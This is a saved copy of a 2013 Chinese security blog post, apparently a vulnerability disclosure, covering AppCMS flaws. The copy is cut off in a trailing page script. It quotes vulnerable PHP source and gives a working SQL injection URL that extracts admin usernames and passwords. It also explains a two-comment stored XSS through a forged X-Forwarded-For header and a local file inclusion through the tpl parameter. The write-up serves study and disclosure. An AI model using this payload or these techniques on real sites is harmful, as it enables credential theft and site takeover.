@@ -1,0 +1,417 @@
+
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="True" name="HandheldFriendly"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
+<meta content="phithon的小站，长期存在与分享关于网络安全与各种编程的原创文章。" name="description"/>
+<meta content="网络安全,代码审计,信息安全,漏洞挖掘,php,C++,mysql,python" name="keywords"/>
+<link href="./AppCMS注入及评论xss漏洞  离别歌/favicon.ico" rel="shortcut icon"/>
+<link href="./AppCMS注入及评论xss漏洞  离别歌/favicon-192x192.png" rel="icon" sizes="192x192" type="image/png"/>
+<link href="./AppCMS注入及评论xss漏洞  离别歌/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"/>
+<title>AppCMS注入及评论xss漏洞 | 离别歌</title>
+<link href="./AppCMS注入及评论xss漏洞  离别歌/font-awesome.min.css" rel="stylesheet"/>
+<link href="./AppCMS注入及评论xss漏洞  离别歌/styles.css" rel="stylesheet"/>
+<link href="./AppCMS注入及评论xss漏洞  离别歌/style.css" rel="stylesheet"/>
+<link href="./AppCMS注入及评论xss漏洞  离别歌/flexboxgrid.min.css" rel="stylesheet"/>
+<link href="./AppCMS注入及评论xss漏洞  离别歌/feed" rel="alternate" title="离别歌" type="application/atom+xml">
+<script src="./AppCMS注入及评论xss漏洞  离别歌/jquery.min.js"></script>
+<link href="./AppCMS注入及评论xss漏洞  离别歌/code.css" rel="stylesheet"/>
+<link href="./AppCMS注入及评论xss漏洞  离别歌/button.css" rel="stylesheet"/>
+<link href="./AppCMS注入及评论xss漏洞  离别歌/pagination.css" rel="stylesheet"/>
+<link href="./AppCMS注入及评论xss漏洞  离别歌/jquery.fancybox.min.css" rel="stylesheet"/>
+</link></meta></head>
+<body>
+<div id="header-post">
+<a class="active" href="#" id="menu-icon"><i class="fa fa-bars fa-lg"></i></a>
+<a class="active" href="#" id="menu-icon-tablet"><i class="fa fa-bars fa-lg"></i></a>
+<a href="#" id="top-icon-tablet" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+<span id="menu" style="visibility: visible">
+<span id="nav">
+<ul>
+<li><a href="/">主页</a></li>
+<li><a href="javascript:history.back(-1)">返回</a></li>
+</ul>
+</span>
+<br/>
+<span id="actions">
+<ul>
+<li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i aria-hidden="true" class="fa fa-chevron-up" onmouseout="$('#i-top').toggle();" onmouseover="$('#i-top').toggle();"></i></a></li>
+<li><a class="icon" href="#"><i aria-hidden="true" class="fa fa-share-alt" onclick="$('#share').toggle();return false;" onmouseout="$('#i-share').toggle();" onmouseover="$('#i-share').toggle();"></i></a></li>
+</ul>
+<span class="info" id="i-top" style="display:none;">Back to top</span>
+<span class="info" id="i-share" style="display:none;">Share post</span>
+</span>
+<br/>
+<div id="share" style="display: none">
+<ul>
+<li><a class="icon" href="http://www.facebook.com/sharer.php?u=https%3A//www.leavesongs.com/PENETRATION/Appcms-Vulnerability.html"><i aria-hidden="true" class="fa fa-facebook "></i></a></li>
+<li><a class="icon" href="https://twitter.com/share?url=https%3A//www.leavesongs.com/PENETRATION/Appcms-Vulnerability.html&amp;text=AppCMS%E6%B3%A8%E5%85%A5%E5%8F%8A%E8%AF%84%E8%AE%BAxss%E6%BC%8F%E6%B4%9E"><i aria-hidden="true" class="fa fa-twitter "></i></a></li>
+<li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3A//www.leavesongs.com/PENETRATION/Appcms-Vulnerability.html&amp;title=AppCMS%E6%B3%A8%E5%85%A5%E5%8F%8A%E8%AF%84%E8%AE%BAxss%E6%BC%8F%E6%B4%9E"><i aria-hidden="true" class="fa fa-linkedin "></i></a></li>
+<li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3A//www.leavesongs.com/PENETRATION/Appcms-Vulnerability.html&amp;is_video=false&amp;description=AppCMS%E6%B3%A8%E5%85%A5%E5%8F%8A%E8%AF%84%E8%AE%BAxss%E6%BC%8F%E6%B4%9E"><i aria-hidden="true" class="fa fa-pinterest "></i></a></li>
+<li><a class="icon" href="mailto:?subject=AppCMS%E6%B3%A8%E5%85%A5%E5%8F%8A%E8%AF%84%E8%AE%BAxss%E6%BC%8F%E6%B4%9E&amp;body=Check out this article: https%3A//www.leavesongs.com/PENETRATION/Appcms-Vulnerability.html"><i aria-hidden="true" class="fa fa-envelope "></i></a></li>
+<li><a class="icon" href="https://getpocket.com/save?url=https%3A//www.leavesongs.com/PENETRATION/Appcms-Vulnerability.html&amp;title=AppCMS%E6%B3%A8%E5%85%A5%E5%8F%8A%E8%AF%84%E8%AE%BAxss%E6%BC%8F%E6%B4%9E"><i aria-hidden="true" class="fa fa-get-pocket "></i></a></li>
+<li><a class="icon" href="http://reddit.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/Appcms-Vulnerability.html&amp;title=AppCMS%E6%B3%A8%E5%85%A5%E5%8F%8A%E8%AF%84%E8%AE%BAxss%E6%BC%8F%E6%B4%9E"><i aria-hidden="true" class="fa fa-reddit "></i></a></li>
+<li><a class="icon" href="http://www.stumbleupon.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/Appcms-Vulnerability.html&amp;title=AppCMS%E6%B3%A8%E5%85%A5%E5%8F%8A%E8%AF%84%E8%AE%BAxss%E6%BC%8F%E6%B4%9E"><i aria-hidden="true" class="fa fa-stumbleupon "></i></a></li>
+<li><a class="icon" href="http://digg.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/Appcms-Vulnerability.html&amp;title=AppCMS%E6%B3%A8%E5%85%A5%E5%8F%8A%E8%AF%84%E8%AE%BAxss%E6%BC%8F%E6%B4%9E"><i aria-hidden="true" class="fa fa-digg "></i></a></li>
+<li><a class="icon" href="http://www.tumblr.com/share/link?url=https%3A//www.leavesongs.com/PENETRATION/Appcms-Vulnerability.html&amp;name=AppCMS%E6%B3%A8%E5%85%A5%E5%8F%8A%E8%AF%84%E8%AE%BAxss%E6%BC%8F%E6%B4%9E&amp;description="><i aria-hidden="true" class="fa fa-tumblr "></i></a></li>
+</ul>
+</div>
+</span>
+</div>
+<div class="content index width mx-auto px2 my4">
+<article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header>
+<h1 class="posttitle" itemprop="name headline">AppCMS注入及评论xss漏洞</h1>
+<div class="meta">
+<span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+<span itemprop="name">Phithon</span>
+</span>
+<div class="postdate">
+<time datetime="2013年12月26日 12:51" itemprop="datePublished">
+                    2013 十二月 26 12:51
+                </time>
+</div>
+<div class="article-tag">
+            阅读：6293
+            </div>
+<div class="article-tag">
+<i class="fa fa-bookmark"></i>
+<a class="tag-link" href="/sort/PENETRATION">网络安全</a>
+</div>
+<div class="article-tag">
+<i class="fa fa-tag"></i>
+<a class="tag-link" href="/tag/appcms">appcms</a>,
+                
+                <a class="tag-link" href="/tag/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E">注入漏洞</a>,
+                
+                <a class="tag-link" href="/tag/0day">0day</a>
+</div>
+</div>
+</header>
+<div class="content" itemprop="articleBody">
+<span><span style="font-size:14px;line-height:21px;">近期在法客上发表的文章，在博客里做个整理。</span></span><br>
+<br>
+<span style="font-weight:700;color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">0x01 漏洞演示</span><br/>
+<span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">Appcms是一款开源cms系统，适合做手机应用类的网站。官网地址：</span><a href="http://www.appcms.cc/" target="_blank">http://www.appcms.cc/</a><br/>
+<span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">这是默认首页，看起来挺不错的：</span><br/>
+<a href="https://www.leavesongs.com/content/uploadfile/201312/4efd1388033909.jpg" id="ematt:298" target="_blank"><img alt="01.jpg" border="0" height="280" src="./AppCMS注入及评论xss漏洞  离别歌/thum-4efd1388033909.jpg" title="点击查看原图" width="420"/></a><br/>
+<br/>
+<span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">Sql注入，当时官网演示站的管理账号密码（现在官方已经补了）：</span><br/>
+<a href="https://www.leavesongs.com/content/uploadfile/201312/3fb51388033910.jpg" id="ematt:300" target="_blank"><img alt="02.jpg" border="0" height="78" src="./AppCMS注入及评论xss漏洞  离别歌/thum-3fb51388033910.jpg" title="点击查看原图" width="420"/></a><br/>
+<br/>
+<span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">xss打后台：</span><br/>
+<a href="https://www.leavesongs.com/content/uploadfile/201312/f9961388033911.jpg" id="ematt:302" target="_blank"><img alt="03.jpg" border="0" height="196" src="./AppCMS注入及评论xss漏洞  离别歌/thum-f9961388033911.jpg" title="点击查看原图" width="420"/></a><br/>
+<br/>
+<span style="font-weight:700;color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">0x02 SQL注入原理</span><br/>
+<br/>
+<span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">　　下载最新版本appcms_1.3.890。</span><br/>
+<span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">　　查看index.php，有一段似乎是限制了搜索词的代码：</span><br/>
+<span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">　　    if (!preg_match("/^[\x{4e00}-\x{9fa5}\w {0}]+$/u", $_GET['q'])) {</span><br/>
+<span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">　　        die('搜索词只允许下划线，数字，字母，汉字和空格，请重新输入。点此&lt;a href ="' . SITE_PATH . '"&gt;回到首页&lt;/a&gt;');</span><br/>
+<span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">　　    }</span><br/>
+<span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">　　所以当我们在首页搜索含有’的关键词时会有提示：</span><br/>
+<br/>
+<a href="https://www.leavesongs.com/content/uploadfile/201312/2de41388033912.jpg" id="ematt:304" target="_blank"><img alt="04.jpg" border="0" height="90" src="./AppCMS注入及评论xss漏洞  离别歌/thum-2de41388033912.jpg" title="点击查看原图" width="420"/></a><br/>
+<br/>
+<span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">　　但我们往前看，却发现了一段输出ajax的代码，这时候并没有过滤……所以注入由此产生：</span><br/>
+<div class="blockcode" style="margin:10px 0px;padding:10px 0px 5px 10px;background-color:#F7F7F7;color:#666666;border:1px solid #CCCCCC;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;">
+<div id="code_e7c">
+<ol>
+<li style="font-family:Monaco, Consolas, '&quot;font-size:12px;">
+				　　        //ajax请求联想关键字<br/>
+</li>
+<li style="font-family:Monaco, Consolas, '&quot;font-size:12px;">
+				　　        if (trim($_GET['q']) != '' &amp;&amp; !isset($_GET['tpl'])) {<br/>
+</li>
+<li style="font-family:Monaco, Consolas, '&quot;font-size:12px;">
+				　　                $str = '';<br/>
+</li>
+<li style="font-family:Monaco, Consolas, '&quot;font-size:12px;">
+				　　                $sql = "SELECT app_id,app_title,app_down FROM " . TB_PREFIX . "app_list WHERE app_title LIKE '%" . trim($_GET['q']) . "%' LIMIT 15";<br/>
+</li>
+<li style="font-family:Monaco, Consolas, '&quot;font-size:12px;">
+				　　                $app_list = $dbm -&gt;query($sql);<br/>
+</li>
+<li style="font-family:Monaco, Consolas, '&quot;font-size:12px;">
+				　　                if (count($app_list['list']) &gt; 0) {<br/>
+</li>
+<li style="font-family:Monaco, Consolas, '&quot;font-size:12px;">
+				　　                        foreach ($app_list['list'] as $k =&gt; $v){<br/>
+</li>
+<li style="font-family:Monaco, Consolas, '&quot;font-size:12px;">
+				　　                                $app_list['list'][$k]['app_title'] = helper :: utf8_substr($v['app_title'], 0, 20);<br/>
+</li>
+<li style="font-family:Monaco, Consolas, '&quot;font-size:12px;">
+				　　                        }<br/>
+</li>
+<li style="font-family:Monaco, Consolas, '&quot;font-size:12px;">
+				　　                        echo json_encode($app_list['list']);<br/>
+</li>
+<li style="font-family:Monaco, Consolas, '&quot;font-size:12px;">
+				　　                        exit;<br/>
+</li>
+<li style="font-family:Monaco, Consolas, '&quot;font-size:12px;">
+				　　                } else {<br/>
+</li>
+<li style="font-family:Monaco, Consolas, '&quot;font-size:12px;">
+				　　                        exit;<br/>
+</li>
+<li style="font-family:Monaco, Consolas, '&quot;font-size:12px;">
+				　　                }<br/>
+</li>
+<li style="font-family:Monaco, Consolas, '&quot;font-size:12px;">
+				　　        }
+			</li>
+</ol>
+</div>
+<span style="font-size:12px;color:#336699 !important;">复制代码</span>
+</div>
+<br/>
+<span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">　　当$_GET[‘q’]非空且$_GET[‘tpl’]为空时进入这个IF，因为刚才我们搜索的时候参数是这样：?tpl=search&amp;q='sd，所以才没有进入这个if。</span><br/>
+<span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">　　我们看到这个if语句中，直接把trim($_GET[‘q’])带入了select语句，造成了注入。</span><br/>
+<span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">　　给出利用exp:</span><br/>
+<div class="blockcode" style="margin:10px 0px;padding:10px 0px 5px 10px;background-color:#F7F7F7;color:#666666;border:1px solid #CCCCCC;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;">
+<div id="code_n27">
+<ol>
+<li style="font-family:Monaco, Consolas, '&quot;font-size:12px;">
+				index.php?q=xxoo'union select 1,uname,upass from appcms_admin_list where uid like '
+			</li>
+</ol>
+</div>
+<span style="font-size:12px;color:#336699 !important;">复制代码</span>
+</div>
+<br/>
+<span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">        </span><span style="background-color:#FFFFFF;"><span>不过爆出了管理员密码也有点鸡肋，因为这个</span></span><span style="background-color:#FFFFFF;"><span>cms</span></span><span style="background-color:#FFFFFF;"><span><span>强制让用户修改后台地址。所以，我们需要想点方法弄到后台地址。于是，下面这个xss由此产生。</span></span></span><br/>
+<span style="background-color:#FFFFFF;"><span><span><br/>
+</span></span></span><br/>
+<span style="font-weight:700;color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">0x03 XSS原理</span><br/>
+<br/>
+<span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">comment.php 获得IP地址，并插入数据库：</span><br/>
+<div class="blockcode" style="margin:10px 0px;padding:10px 0px 5px 10px;background-color:#F7F7F7;color:#666666;border:1px solid #CCCCCC;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;">
+<div id="code_42y">
+<ol>
+<li style="font-family:Monaco, Consolas, '&quot;font-size:12px;">
+				    /**<br/>
+</li>
+<li style="font-family:Monaco, Consolas, '&quot;font-size:12px;">
+				     * 获取客户端IP地址<br/>
+</li>
+<li style="font-family:Monaco, Consolas, '&quot;font-size:12px;">
+				     */<br/>
+</li>
+<li style="font-family:Monaco, Consolas, '&quot;font-size:12px;">
+				    public static function getip() {<br/>
+</li>
+<li style="font-family:Monaco, Consolas, '&quot;font-size:12px;">
+				        $onlineip = '';<br/>
+</li>
+<li style="font-family:Monaco, Consolas, '&quot;font-size:12px;">
+				        if (getenv('HTTP_CLIENT_IP') &amp;&amp; strcasecmp(getenv('HTTP_CLIENT_IP'), 'unknown')) {<br/>
+</li>
+<li style="font-family:Monaco, Consolas, '&quot;font-size:12px;">
+				            $onlineip = getenv('HTTP_CLIENT_IP');<br/>
+</li>
+<li style="font-family:Monaco, Consolas, '&quot;font-size:12px;">
+				        } elseif (getenv('HTTP_X_FORWARDED_FOR') &amp;&amp; strcasecmp(getenv('HTTP_X_FORWARDED_FOR'), 'unknown')) {<br/>
+</li>
+<li style="font-family:Monaco, Consolas, '&quot;font-size:12px;">
+				            $onlineip = getenv('HTTP_X_FORWARDED_FOR');<br/>
+</li>
+<li style="font-family:Monaco, Consolas, '&quot;font-size:12px;">
+				        } elseif (getenv('REMOTE_ADDR') &amp;&amp; strcasecmp(getenv('REMOTE_ADDR'), 'unknown')) {<br/>
+</li>
+<li style="font-family:Monaco, Consolas, '&quot;font-size:12px;">
+				            $onlineip = getenv('REMOTE_ADDR');<br/>
+</li>
+<li style="font-family:Monaco, Consolas, '&quot;font-size:12px;">
+				        } elseif (isset($_SERVER['REMOTE_ADDR']) &amp;&amp; $_SERVER['REMOTE_ADDR'] &amp;&amp; strcasecmp($_SERVER['REMOTE_ADDR'], 'unknown')) {<br/>
+</li>
+<li style="font-family:Monaco, Consolas, '&quot;font-size:12px;">
+				            $onlineip = $_SERVER['REMOTE_ADDR'];<br/>
+</li>
+<li style="font-family:Monaco, Consolas, '&quot;font-size:12px;">
+				        }<br/>
+</li>
+<li style="font-family:Monaco, Consolas, '&quot;font-size:12px;">
+				        return $onlineip;<br/>
+</li>
+<li style="font-family:Monaco, Consolas, '&quot;font-size:12px;">
+				　　}
+			</li>
+</ol>
+</div>
+<span style="font-size:12px;color:#336699 !important;">复制代码</span>
+</div>
+<span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">　　当HTTP_X_FORWARDED_FOR存在时获取的IP就是它，但是HTTP_X_FORWARDED_FOR是可以伪造的，所以造成了XSS代码的注入。</span><br/>
+<span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">　　但在数据库中，ip这个字段限制了字数，只有20字，所以绕过成为了难点。</span><br/>
+<br/>
+<span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">　　所以我们来构造。</span><br/>
+<span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">　　首先留一条言，内容是我们要写的xss代码，我这里就简单的弹出窗口：</span><br/>
+<br/>
+<span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">         </span><a href="https://www.leavesongs.com/content/uploadfile/201312/13501388033913.jpg" id="ematt:306" target="_blank"><img alt="05.jpg" border="0" height="99" src="./AppCMS注入及评论xss漏洞  离别歌/thum-13501388033913.jpg" title="点击查看原图" width="420"/></a><span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;"></span><br/>
+<br/>
+<p align="left" style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;background-color:#FFFFFF;">
+	发表的时候抓包，修改<span>X-FORWARDED-FOR</span><span>，写半个闭合的</span><span>script</span><span>：</span>
+</p>
+<br/>
+<span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">         </span><a href="https://www.leavesongs.com/content/uploadfile/201312/fac41388033914.jpg" id="ematt:308" target="_blank"><img alt="06.jpg" border="0" height="151" src="./AppCMS注入及评论xss漏洞  离别歌/thum-fac41388033914.jpg" title="点击查看原图" width="420"/></a><span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;"></span><br/>
+<br/>
+<p align="left" style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;background-color:#FFFFFF;">
+	然后刷新页面后再次写一条留言，内容就无所谓了，仍然是抓包，写前半个<span>script</span><span>标签：</span>
+</p>
+<br/>
+<span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">         </span><a href="https://www.leavesongs.com/content/uploadfile/201312/e4bd1388033915.jpg" id="ematt:310" target="_blank"><img alt="07.jpg" border="0" height="155" src="./AppCMS注入及评论xss漏洞  离别歌/thum-e4bd1388033915.jpg" title="点击查看原图" width="420"/></a><span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;"></span><br/>
+<br/>
+<p align="left" style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;background-color:#FFFFFF;">
+	这时任务就算完成了，实战的话就坐等接收<span>cookie</span><span>和后台地址了。</span>
+</p>
+<p align="left" style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;background-color:#FFFFFF;">
+	我们可以来到管理员页面 <span>- </span><span>查看评论，可以看到窗口已经弹了：</span>
+</p>
+<br/>
+<span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">        </span><br/>
+<br/>
+<p align="left" style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;background-color:#FFFFFF;">
+	我们看看源码：
+</p>
+<br/>
+<span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">         </span><a href="https://www.leavesongs.com/content/uploadfile/201312/86c31388033916.jpg" id="ematt:312" target="_blank"><img alt="08.jpg" border="0" height="99" src="./AppCMS注入及评论xss漏洞  离别歌/thum-86c31388033916.jpg" title="点击查看原图" width="420"/></a><span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;"></span><br/>
+<p align="left" style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;background-color:#FFFFFF;">
+	看懂了吗，两次插入的内容正好闭合了，中间用注释符注释掉，然后第一次插入的评论内容就是我们的<span>javascript</span><span>代码，而这个代码的两遍用注释符再闭合掉就可以了。</span>
+</p>
+<p align="left" style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;background-color:#FFFFFF;">
+	我们运用两次留言成功构造了一个<span>xss</span><span>，绕过了最大长度为</span><span>20</span><span>的限制。</span>
+</p>
+<br/>
+<span style="font-weight:700;color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">0x04 LFI</span><br/>
+<span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">除了上面两个已经成功的漏洞以外，index.php里还存在一个本地文件包含，不过需要进行截断。</span><br/>
+<div class="blockcode" style="margin:10px 0px;padding:10px 0px 5px 10px;background-color:#F7F7F7;color:#666666;border:1px solid #CCCCCC;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;">
+<div id="code_01Z">
+<ol>
+<li style="font-family:Monaco, Consolas, '&quot;font-size:12px;">
+				if (substr($tpl, strlen($tpl)-4, 4) == '.php') {<br/>
+</li>
+<li style="font-family:Monaco, Consolas, '&quot;font-size:12px;">
+				    $tmp_file = '/templates/' . $from_mobile . '/' . $tpl;<br/>
+</li>
+<li style="font-family:Monaco, Consolas, '&quot;font-size:12px;">
+				} else {<br/>
+</li>
+<li style="font-family:Monaco, Consolas, '&quot;font-size:12px;">
+				    $tmp_file = '/templates/' . $from_mobile . '/' . $tpl . '.php';<br/>
+</li>
+<li style="font-family:Monaco, Consolas, '&quot;font-size:12px;">
+				} <br/>
+</li>
+<li style="font-family:Monaco, Consolas, '&quot;font-size:12px;">
+				if (!file_exists(dirname(__FILE__) . $tmp_file)) die('模板页面不存在' . $tmp_file);<br/>
+</li>
+<li style="font-family:Monaco, Consolas, '&quot;font-size:12px;">
+				require(dirname(__FILE__) . $tmp_file);
+			</li>
+</ol>
+</div>
+<span style="font-size:12px;color:#336699 !important;">复制代码</span>
+</div>
+<span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">判断后缀是不是php，如果不是就加上.php，然后判断文件是否存在，进行包含。并没有任何过滤。其中最初的这个$tpl就是$_GET['tpl']。</span><br/>
+<span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">官网测试：</span><br/>
+<a href="https://www.leavesongs.com/content/uploadfile/201312/10581388033917.jpg" id="ematt:314" target="_blank"><img alt="09.jpg" border="0" height="218" src="./AppCMS注入及评论xss漏洞  离别歌/thum-10581388033917.jpg" title="点击查看原图" width="420"/></a><span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;"></span><br/>
+<span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">成功包含了数据库配置文件，因为重复包含，所以出错了。</span><br/>
+<span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">我试过截断包含一些日志文件或其他文件( 可惜前台不能上传 )，但不知道为什么都没有成功，如果大家有什么好思路也可以跟我说说。</span><br/>
+<span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br/>
+<span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br/>
+<br/>
+<span style="color:#444444;font-family:Tahoma, 'Microsoft Yahei', Simsun;font-size:14px;line-height:21px;background-color:#FFFFFF;">大礼包到此结束，希望大家能学到知识，而不是又得到了很多服务器。</span>
+</br></br></div>
+</article>
+<div id="reply-list">
+<h1>评论</h1>
+<div class="row" id="comment-1537">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./AppCMS注入及评论xss漏洞  离别歌/76f3813e8cb127365fb9d197f7c30d37.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://哈尔滨seo" target="_blank">看名字</a>
+<time datetime="2014年1月6日 11:09" itemprop="datePublished">
+                            2014 一月 06 11:09
+                        </time>
+<a href="javascript:reply_to('1537', '看名字')">回复</a>
+</p>
+<p class="comment-meta">不错 看看。。。。 写的挺好。</p>
+</div>
+</div>
+</div>
+<form action="#reply" enctype="multipart/form-data" id="reply" method="post">
+<textarea cols="40" id="id_content" name="content" required="" rows="6">
+</textarea>
+<div class="row">
+<div class="col-xs-4">
+<input id="id_nickname" maxlength="64" name="nickname" placeholder="昵称" required="" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_email" maxlength="254" name="email" placeholder="邮箱（可留空）" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_url" maxlength="200" name="url" placeholder="链接（可留空）" type="text"/>
+</div>
+</div>
+<div class="row" style="margin-top: 8px"><div class="col-xs-4"><input autocomplete="off" id="id_captcha_1" name="captcha_1" placeholder="验证码" type="text"/> <input id="id_captcha_0" name="captcha_0" type="hidden" value="32fa6374fff1bf3e9e37d5b2ed5525225ffda141"/>
+</div><div class="col-xs-4">
+<img alt="captcha" class="captcha" height="25" src="./AppCMS注入及评论xss漏洞  离别歌/32fa6374fff1bf3e9e37d5b2ed5525225ffda141"/></div></div>
+<div class="clearfix"></div>
+<input class="ui-button ui-button-sgreen" type="submit" value="提交"/>
+<input id="id_archive" name="archive" type="hidden" value="291">
+<input id="id_parent" name="parent" type="hidden"/>
+<input name="csrfmiddlewaretoken" type="hidden" value="9KOXRjy15KhhGD1L2ipwxaBLZLTn0h6FH49tFNKgwxbGGip0QzTg6ODQ8PmvJLVP"/>
+</input></form>
+</div>
+<footer id="footer">
+<div class="footer-left">
+    Copyright © 2017 Powered by talkbook
+  </div>
+<div class="footer-right">
+<nav>
+<ul>
+<li><a href="/">首页</a></li>
+<li><a href="http://weibo.com/101yx" target="_blank">微博</a></li>
+<li><a href="https://github.com/phith0n" target="_blank">项目</a></li>
+<li><a href="/template/change/">更换模板</a></li>
+</ul>
+</nav>
+</div>
+</footer>
+<script src="./AppCMS注入及评论xss漏洞  离别歌/main.js"></script>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?ad9ab5e37c2811b9f0979e46123fc898";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+<script src="./AppCMS注入及评论xss漏洞  离别歌/jquery.fancybox.pack.js"></script>
+<script>
+$(document).ready(function () {
+    $("article a").each(function (i, e) {
+        if(e.host != 'www.leavesongs.com') {
